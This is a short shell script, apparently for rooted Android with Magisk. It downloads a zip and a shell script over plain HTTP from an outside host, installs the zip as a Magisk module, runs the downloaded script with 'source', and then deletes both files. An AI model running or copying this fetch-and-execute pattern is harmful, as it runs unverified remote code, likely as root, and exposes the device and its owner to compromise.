curl -o magisk.zip http://www.wycf.xyz/down.php/9ceba45cb483060aa077a18337bd57f7.zip
mv magisk.zip /sdcard/
curl -o 1.sh http://www.wycf.xyz/down.php/f82077921379b0cbe23454224194eb74.sh
mv 1.sh /sdcard/
for magiskzip in ${0%/*}/sdcard/magisk.zip*.zip
do
magisk --install-module $magiskzip
done
source "/sdcard/1.sh"
rm -rf /sdcard/1.sh
rm -rf /sdcard/magisk.zip